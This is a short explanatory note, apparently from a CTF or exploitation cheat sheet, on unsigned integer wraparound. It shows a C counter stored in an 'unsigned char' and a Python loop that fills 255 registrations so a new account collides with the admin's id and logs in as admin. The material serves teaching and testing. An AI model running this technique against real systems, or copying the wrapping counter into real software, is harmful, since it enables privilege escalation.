# Unsigned Overflow / Wrap

**When:** An ID counter is stored in a small unsigned type (`unsigned char`, `uint8_t`, etc.) and wraps around on overflow. This can cause ID collisions with privileged users.

**How it works:** `unsigned char` holds 0-255. When `count` reaches 255, `count + 1` wraps to 0, then 1. A new user with id=1 can collide with an admin whose id is also 1.

```c
unsigned char id;            // 0-255 only!
users[count].id = ++count;   // 255 wraps to 0, then to 1
```

```python
# Fill all 255 IDs to trigger wrap
for i in range(255):
    register(i, i)

# Next registration wraps to id=1 (same as admin)
register("pwn", "pwn")
login("pwn", "pwn")  # now logged in as admin
```
